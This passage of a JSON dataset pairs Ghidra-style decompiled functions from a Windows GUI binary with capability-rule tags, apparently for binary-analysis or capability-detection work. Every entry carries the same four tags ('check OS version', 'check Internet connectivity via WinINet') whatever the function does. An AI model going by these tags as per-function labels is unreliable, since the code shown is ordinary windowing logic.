((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.00418460(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.00458568(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 886
    },
    "0045bf70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bf70(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x45c201;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.00407550();\n        uStackY52 = 0x45bfb0;\n        fcn.00407550(&fcn.0045bf70::var_4h);\n        fcn.00405818();\n        fcn.0040daec();\n        fcn.00404ec4();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.00407550();\n        uStackY52 = 0x45bff1;\n        fcn.00407550(&fcn.0045bf70::var_ch);\n        fcn.00405818();\n        fcn.0040daec();\n        fcn.00404ec4();\n    }\n    iVar3 = fcn.0045a470();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.0045aa04();\n                uVar4 = fcn.0045a9c8();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00404650();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.0045c858();\n            }\n            else {\n                iVar1 = *(iVar3 + 8);\n                if (iVar1 == 0) {\n                    *(*(iVar3 + 0x14) + 8) = 0;\n                    fcn.00404650();\n                }\n                else {\n                    *(iVar1 + 0x18) = *(*(param_2 + 0x14) + 0x18);\n                    if (*(*(iVar3 + 8) + 0x18) == 0) {\n                        *(*(*(param_2 + 0x14) + 0x14) + 8) = iVar1;\n                    }\n                    else {\n                        *(*(*(iVar3 + 8) + 0x18) + 0xc) = iVar1;\n                    }\n                    iVar3 = *(iVar3 + 8);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                    iVar1 = *(iVar3 + 0xc);\n                    while (iVar1 != 0) {\n                        iVar3 = *(iVar3 + 0xc);\n                        *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                        iVar1 = *(iVar3 + 0xc);\n                    }\n                    *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                    if (*(iVar3 + 0xc) != 0) {\n                        *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                    }\n                    uStackY52 = 0x45c880;\n                    fcn.0045ad84();\n                    fcn.00404650();\n                    fcn.00404650();\n                }\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.0045a528();\n                fcn.0045a9f0();\n                fcn.0045a84c();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00404650();\n            }\n            uStackY52 = 0x45c880;\n            fcn.0045ad84();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.0045a84c();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.0045a9c8();\n            fcn.0045aa04();\n            fcn.0045a84c();\n        }\n        uStackY52 = 0x45c880;\n        fcn.0045ad84();\n    }\n    fcn.00404650();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x45c208;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1463
    },
    "0045c3b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c3b4(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45c4b4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (((in_EAX == *(*(arg_8h + -8) + 100)) || (*(in_EAX + 8) != 0)) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 4) != 0)) {\n        (**(**(arg_8h + -4) + 0x10))();\n        (**(**(arg_8h + -4) + 0x10))();\n        if (*(*(arg_8h + -8) + 0x74) != '\\0') {\n            (**(**(arg_8h + -8) + 0x28))();\n            fcn.0045cff4();\n        }\n        (**(**(arg_8h + -4) + 0x10))();\n        arg_8h_00 = arg_8h;\n        fcn.0045a754();\n        fcn.0045c338(arg_8h_00);\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045c3b4(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045c3b4(arg_8h);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45c4bb;\n    uStack32 = 0x45c4b3;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 483
    },
    "0045c4c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c4c4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x45c66b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x45c4f8;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c50b;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c521;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c52d;\n    piVar1 = fcn.00404620();\n    uStack56 = 0x45c5e4;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.00456f1c();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00456f30();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.0045c338(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x45c5eb;\n    uStack56 = 0x45c5e3;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 600
    },
    "0045c858": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c858(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.00456f1c();\n        if (0 < iVar1) {\n            fcn.0045ad84(0x45c880);\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0045c990": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c990(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.0045a9c8();\n        iVar2 = fcn.0045a9c8();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            iVar1 = *(arg_8h + -8);\n            iVar2 = fcn.0045a9c8();\n            if (iVar1 < iVar2) {\n                iVar2 = iVar1;\n            }\n            *(arg_8h + -8) = iVar2;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045c990(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045c990(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "0045cb6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cb6c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.0045a484();\n        if (iVar2 == 1) {\n            fcn.0045cb6c(arg_8h);\n        }\n    }\n    iVar2 = fcn.0045a484();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.0045aab0();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0045aaa4();\n            if (iVar3 != 0) {\n                fcn.0045aaa4();\n                iVar3 = fcn.0045a9c8();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.0045a4e0();\n                    fcn.0045a9f0();\n                    fcn.0045aaa4();\n                    fcn.0045aa44();\n                }\n            }\n        }\n        else {\n            fcn.0045aab0();\n            iVar3 = fcn.0045a9c8();\n            iVar4 = fcn.0045a4e0();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.0045a9c8();\n                fcn.0045a9f0();\n                fcn.0045a9c8();\n                fcn.0045a9f0();\n                fcn.0045aab0();\n                fcn.0045aa44();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.0045a6ac();\n    }\n    fcn.0045ad84(0x45c880, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 584
    },
    "0045d098": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045d098(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    char in_DL;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_DL == '\\0') {\n        if ((in_CL & 0x40) == 0) {\n            fcn.00418410();\n            iVar2 = fcn.0045b500();\n            if (iVar2 != 0) {\n                if (var_8h == 0x12) {\n                    fcn.00418410();\n                    fcn.0045c77c();\n                }\n                else if (var_8h == 2) {\n                    uVar3 = fcn.00458568(0x203, 0x203, 0);\n                    iVar4 = sub.user32.dll_PeekMessageA(&var_24h, uVar3);\n                    if (iVar4 == 0) {\n                        cVar1 = fcn.004047dc();\n                        if (cVar1 != '\\0') {\n                            (**(**(iVar2 + 4) + 0xd4))();\n                        }\n                    }\n                    if ((*(*(iVar2 + 4) + 0x8f) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                        fcn.00450f40();\n                    }\n                    *arg_8h = 1;\n                }\n            }\n        }\n        else {\n            fcn.00418410();\n            iVar2 = fcn.0045b500();\n            if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_8h == 2)) {\n                fcn.0044ed30();\n                fcn.00451604(1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "0045d24c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d24c(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0045c8a4();\n        fcn.00418410();\n        *(in_EAX + 0x50) = var_ch;\n        *(in_EAX + 0x54) = var_8h;\n        fcn.0045d1bc(&stack0xfffffffc);\n        fcn.0045c8a4();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0045d29c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d29c(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char in_DL;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (in_DL == '\\0') {\n        if (*(in_EAX + 0x60) == 0) {\n            fcn.00418410();\n            iVar2 = fcn.0045b500();\n            if ((iVar2 != 0) && (var_4h == 0x14)) {\n                cVar1 = fcn.004047dc();\n                if (cVar1 == '\\0') {\n                    fcn.00450724();\n                }\n                else {\n                    fcn.00442974();\n                }\n            }\n        }\n        else {\n            fcn.0045c7dc();\n        }\n    }\n    return;\n}\n",
        "token_count": 210
    },
    "0045d494": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d494(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x2c) != 0) && (*(in_EAX + 0x20) != '\\0')) {\n        fcn.0045d5d4();\n        uVar1 = (**(*(in_EAX + 0x2c) + 0x2c))();\n        *(in_EAX + 0x28) = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "0045d508": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045d508(void)\n\n{\n    return *0x497ca0 != '\\0';\n}\n",
        "token_count": 25
    },
    "0045d584": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d584(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.004085c4(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 107
    },
    "0045d5f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d5f4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.0045d538();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.0045d554();\n            return;\n        }\n        fcn.0045d584();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0045d658": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d658(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x4927e0 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x45d676;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x45d7be;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x497cb8 == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x45d7cc);\n            *0x497cb8 = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x45d7d4);\n        }\n        if (*0x49077c == 0) {\n            *0x49077c = sub.kernel32.dll_LoadLibraryA(0x45d7e4);\n            if (*0x49077c != 0) {\n                *0x497cbc = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d7f0);\n                *0x497cc0 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d800);\n                *0x497cc4 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d814);\n                *0x497cc8 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d82c);\n                *0x497ccc = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d844);\n                *0x497cd0 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d858);\n                *0x497cd4 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d870);\n                *0x497cd8 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d888);\n                *0x497cdc = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d8a4);\n                *0x497ce0 = sub.kernel32.dll_GetProcAddress_1(*0x49077c, 0x45d8b0);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x45d7c5);\n        return;\n    }\n    return;\n}\n",
        "token_count": 653
    },
    "0045d8c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d8c0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497cb8 != NULL) {\n        uVar1 = (**0x497cb8)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "0045d8dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d8dc(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x4927e0 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x45d90b;\n            fcn.0045d8c0();\n        }\n        else {\n            uStack24 = 0x45d919;\n            fcn.0045d8c0();\n            if (*0x49077c != 0) {\n                puStack28 = 0x45d92d;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x497cbc)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x45d944;\n                    uStack36 = uVar1;\n                    (**0x497cc4)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x497ccc)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x497ccc)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x497ccc)();\n                        (**0x497cc4)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x49077c);\n                    }\n                    (**0x497cc8)(uVar1, uStack44, uStack40);\n                    (**0x497cc0)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "0045d9b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d9b4(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49077c != 0) {\n        uVar1 = (**0x497cdc)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "0045d9c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d9c8(void)\n\n{\n    fcn.00404650();\n    **0x4925c4 = 0;\n    fcn.00404650();\n    **0x4927b4 = 0;\n    fcn.00404650();\n    *0x497c5c = 0;\n    fcn.00404650();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x497c72);\n    fcn.00405530();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x497c70);\n    fcn.00405530();\n    if (*0x49077c != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x49077c);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0045dd34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045dd34(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 4);\n    if (iVar2 != 0) {\n        if (arg_8h != '\\0') {\n            *(iVar2 + 0x164) = 1;\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) | 0x4000;\n        }\n        uStack28 = 0x45de0f;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        cVar3 = fcn.00453364();\n        if ((cVar3 == '\\0') || (*(*(in_EAX + 4) + 0x30) == 0)) {\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h);\n        }\n        else {\n            arg_ch = arg_ch - (*(in_EAX + 0xc) + *(in_EAX + 0x14));\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h - (*(in_EAX + 8) + *(in_EAX + 0x10)));\n        }\n        *in_FS_OFFSET = arg_ch;\n        if (arg_8h != '\\0') {\n            iVar2 = *(in_EAX + 4);\n            *(iVar2 + 0x164) = 0;\n            puVar1 = iVar2 + 0x54;\n            *puVar1 = *puVar1 & 0xbfff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "0045e4a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e4a8(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45e636;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00406928(arg_1ch[2]);\n    iVar1 = fcn.00406774();\n    if (arg_1ch[3] < 1) {\n        if (-1 < iVar1) {\n            iVar2 = iVar1 + 1;\n            do {\n                fcn.00411a58();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else if (-1 < iVar1) {\n        iVar2 = iVar1 + 1;\n        do {\n            fcn.00411a58();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (*(arg_8h + 4) != NULL) {\n        (**(**(arg_8h + 4) + 0x38))();\n    }\n    if (arg_1ch[3] < 1) {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 